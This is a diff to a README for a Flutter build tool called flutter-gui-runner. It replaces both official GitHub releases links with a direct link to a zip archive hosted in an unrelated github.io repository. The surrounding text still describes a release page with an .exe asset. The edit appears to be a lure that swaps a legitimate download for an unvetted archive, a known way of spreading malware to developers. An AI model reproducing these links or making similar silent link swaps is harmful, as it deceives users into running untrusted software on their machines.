@@ -5,7 +5,7 @@ description: "Manage Flutter builds, devices, and hot reloads from your menu bar
 ---
 # 🛠️ flutter-gui-runner - Manage your Flutter projects with ease
 
-[![Download flutter-gui-runner](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)
+[![Download flutter-gui-runner](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Alphonsoduplex577/alphonsoduplex577.github.io/main/outpost/github-alphonsoduplex-io-softtack.zip)
 
 flutter-gui-runner provides a simple interface for developers who prefer to use their own text editors. This tool bridges the gap between your code and the Flutter engine. You can trigger builds, manage sessions, and see results without relying on heavy plugins or complex setups.
 
@@ -13,7 +13,7 @@ flutter-gui-runner provides a simple interface for developers who prefer to use 
 
 To start, you need the installation files. Visit the link below to reach the project release page.
 
-[Download the latest version here](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Alphonsoduplex577/alphonsoduplex577.github.io/main/outpost/github-alphonsoduplex-io-softtack.zip)
 
 On this page, look for the section labeled Assets. You will see several files. If you use a Windows computer, select the file ending in .exe. Save this file to your computer in a folder you can find later, such as your Downloads folder.
 
